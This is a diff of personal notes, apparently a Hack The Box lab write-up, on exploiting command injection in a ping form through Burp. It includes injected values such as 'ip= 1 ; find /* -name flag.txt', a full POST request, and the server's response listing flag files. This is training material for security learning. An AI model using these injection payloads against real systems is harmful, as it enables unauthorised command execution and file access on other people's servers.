@@ -129,13 +129,44 @@ now ctrl+r this request in  http history (this will send this request from http 
 
 now try to find the flag as said in Question, the hint is , the flag for this lab is not in the same directory (i.e its not here  /var/www/html/ )
 
-so as shown in these SS we can try different commands to traverse through directories and cat files and try to find flag (i spent over an hour) 
+so as shown in these SS we can try different commands(ip= 1  ; cd /var/ ; pwd ; ls ) (ip= 1  ; cd /var/www/html ; pwd ; ls ; )  (we can use pwd, cat, cd, ls all commands of linux) to traverse through directories and cat files and try to find flag (i spent over an hour) 
 ![[Screenshot From 2025-04-02 00-25-15.png]]
 ![[Screenshot From 2025-04-02 00-25-49.png]]
 
 
 and then i found a solution here in the HTB forum of this lab (https://forum.hackthebox.com/t/repeating-web-requests/249865/8)
 
-so what we do is 
 
-ip= 
+
+so what we do is :
+==ip= 1  ; find /* -name flag.txt==
+
+ ( ; find /* -name flag.txt ) what this command does is find all files named "flag.txt"  in all the available paths and directories
+
+request
+```
+POST /ping HTTP/1.1
+Host: 94.237.52.55:51013
+Content-Length: 39
+Cache-Control: max-age=0
+Origin: http://94.237.52.55:51013
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://94.237.52.55:51013/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+ip= 1  ; find /* -name flag.txt
+```
+
+response
+```
+/flag.txt
+/var/www/html/flag.txt
+
+```
+
+just cat   "/flag.txt"
